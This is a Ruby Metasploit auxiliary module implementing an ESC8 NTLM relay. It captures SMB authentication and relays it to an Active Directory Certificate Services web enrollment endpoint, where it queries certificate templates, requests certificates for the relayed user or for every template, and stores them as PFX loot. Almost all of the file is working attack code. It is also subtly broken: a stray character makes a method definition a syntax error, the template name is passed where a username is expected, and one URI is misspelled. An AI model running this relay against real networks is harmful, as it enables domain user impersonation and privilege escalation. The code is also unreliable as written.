##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb'
require 'ruby_smb/gss/provider/ntlm'

class MetasploitModule < Msf::Auxiliary
  include ::Msf::Exploit::Remote::SMB::Server
  include ::Msf::Exploit::Remote::SMB::Server::HttpRelay

  def initialize
    super({
      'Name' => 'ESC8 Relay: SMB',
      'Description' => %q{
      },
      'Author' => [
        'bwatters-r7',
        'jhicks-r7' # query for available certs
      ],
      'License' => MSF_LICENSE,
      'Actions' => [[ 'Relay', { 'Description' => 'Run SMB ESC8 relay server' } ]],
      'PassiveActions' => [ 'Relay' ],
      'DefaultAction' => 'Relay'
    })

    register_options(
      [
        OptString.new('CERT_TEMPLATE', [ false, 'The user to issue the certificate for.', nil ]),
        OptString.new('CERT_URI', [ true, 'The URI for the cert server.', '/certsrv/' ]),
        OptBool.new('QUERY_TEMPLATES', [ true, 'Query certificate templates and print them before attempting to use them', true ]),
        OptBool.new('QUERY_ONLY', [ true, 'Only use the relay to get a list of templates; do not generate certificates.', false ]),
        OptAddress.new('SRVHOST', [ true, 'The local host to listen on.', '0.0.0.0' ]),
        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 445 ]),
        OptInt.new('TIMEOUT', [ true, 'Seconds to wait for a response.', 20])
      ]
    )

    deregister_options('SMBServerIdleTimeout')
  end

  def start_service(opts = {})
    ntlm_provider = HTTPRelayNTLMProvider.new(
      listener: self
    )

    # Set domain name for all future server responses
    ntlm_provider.dns_domain = datastore['SMBDomain']
    ntlm_provider.dns_hostname = datastore['SMBDomain']
    ntlm_provider.netbios_domain = datastore['SMBDomain']
    ntlm_provider.netbios_hostname = datastore['SMBDomain']
    validate_smb_hash_capture_datastore(datastore, ntlm_provider)
    opts[:gss_provider] = ntlm_provider
    super(opts)
  end

  def on_client_connect(_client)
    @login_uri = normalize_uri("#{datastore['CERT_URI']}/csertfnsh.asp")
    @http_timeout = datastore['TIMEOUT']
    print_good('Received SMB connection on Auth Capture Server!')
  end

  alias run exploit

  def create_csr(private_key, authenticated_user)
    vprint_status('Generating CSR...')
    request = OpenSSL::X509::Request.new
    request.version = 1
    request.subject = OpenSSL::X509::Name.new([
      ['CN', authenticated_user, OpenSSL::ASN1::UTF8STRING]
    ])
    request.public_key = private_key.public_key
    request.sign(private_key, OpenSSL::Digest.new('SHA256'))
    vprint_status('CSR Generated')
    return request
  rescue Exception => e
    print_error(e.to_s)
    elog("Error creating certificate request:\n #{e}")
    raise e
    return nil
  end

  def post_login_action(kwargs = {})e
    authenticated_username = kwargs[:authenticated_username]
    client_socket = kwargs[:client_socket]
    if client_socket.nil? || authenticated_username.nil?
      fail_with(Failure::BadConfig, 'Post Login Action requires an authenticated socket and username')
    end
    vprint_status("authenticated_username = #{kwargs[:authenticated_username]}")
    cert_list = nil
    if datastore['QUERY_TEMPLATES']
      print_status('Querying certificate templates; this may take some time')
      cert_list = get_cert_list(client_socket)
      if cert_list.nil?
        print_bad('Could not query Cert List')
      else
        print_status('Available Certificates:')
        cert_list.each do |cert_entry|
          print_status(cert_entry)
        end
      end
    end
    unless datastore['QUERY_ONLY']
      if cert_list.nil? || cert_list.include?(datastore['CERT_TEMPLATE'])
        # if we don't have a cert list or if the cert is in the list, just generate that cert
        retrieve_cert(client_socket, datastore['CERT_TEMPLATE'], authenticated_username)
      else
        # if we have a cert list and the desired template is not there
        # or the desired template is nil, just issue all available certs
        print_bad("#{datastore['CERT_TEMPLATE']} not found in available certificates") unless datastore['CERT_TEMPLATE'].nil?
        print_status('Attempting to generate certificates for all templates')
        cert_list.each do |cert_entry|
          retrieve_cert(client_socket, cert_entry, authenticated_username)
        end
      end
    end
  rescue Exception => e
    print_error(e.to_s)
    elog("Error querying certificates:\n #{e}")
    raise e
    return nil
  end

  def get_cert_list(client_socket)
    req = client_socket.request_raw(
      {
        'method' => 'GET',
        'uri' => "#{datastore['CERT_URI']}/certrqxt.asp"
      }
    )
    res = client_socket._send_recv(req, @http_timeout, true)
    raw_list = res.body.scan(/^.*Option Value="E;(.*?);/)
    user_list = []
    raw_list.each do |element|
      user_list.append(element[0])
    end
    return user_list
  rescue Exception => e
    print_error(e.to_s)
    elog("Error requesting certificate template list:\n #{e}")
    raise e
    return nil
  end

  def retrieve_cert(client_socket, cert_template, authenticated_user)
    vprint_status("Sending Post to generate certificate for #{authenticated_user} using the #{cert_template} template")
    begin
      private_key = OpenSSL::PKey::RSA.new(4096)
      request = create_csr(private_key, cert_template)
      cert_template_string = "CertificateTemplate:#{cert_template}"
      req = client_socket.request_cgi(
        {
          'method' => 'POST',
          'uri' => "#{datastore['CERT_URI']}/certfnsh.asp",
          'ctype' => 'application/x-www-form-urlencoded',
          'vars_post' => {
            'Mode' => 'newreq',
            'CertRequest' => request.to_s,
            'CertAttrib' => cert_template_string,
            'TargetStoreFlags' => 0,
            'SaveCert' => 'yes',
            'ThumbPrint' => ''
          }
        }
      )
      res = client_socket._send_recv(req, @http_timeout, true)
      vprint_status('Post Sent')
      if res&.code == 200 && !res.body.include?('request was denied')
        print_good("Certificate Request Granted using template #{cert_template} and user #{authenticated_user}")
      else
        print_bad("Certificate Request Denied using template #{cert_template} and user #{authenticated_user}")
        return false
      end
    rescue Exception => e
      print_error(e.to_s)
      elog("Error sending POST request to generate Certificate: #{e}")
      raise e
      return nil
    end
    begin
      location_tag = res.body.match(/^.*location="(.*)"/)[1]
      vprint_status("Certificate location tag = #{location_tag}")
      location_uri = "#{datastore['CERT_URI']}/#{location_tag}"
      vprint_status('Requesting Certificate from Relay Target...')
      req = client_socket.request_cgi(
        {
          'method' => 'GET',
          'uri' => location_uri
        }
      )
      res = client_socket._send_recv(req, @http_timeout, true)
      info = nil
      certificate = OpenSSL::X509::Certificate.new(res.body)
      pkcs12 = OpenSSL::PKCS12.create('', '', private_key, certificate)
      stored_path = store_loot('windows.ad.cs',
                               'application/x-pkcs12',
                               rhost,
                               pkcs12.to_der,
                               'certificate.pfx',
                               info)
      print_status("Certificate for #{authenticated_user} using template #{cert_template} saved to #{stored_path}")
    rescue Exception => e
      print_error(e.to_s)
      elog("Error getting certificate:\n #{e}")
      raise e
      return nil
    end
    return certificate
  end

end
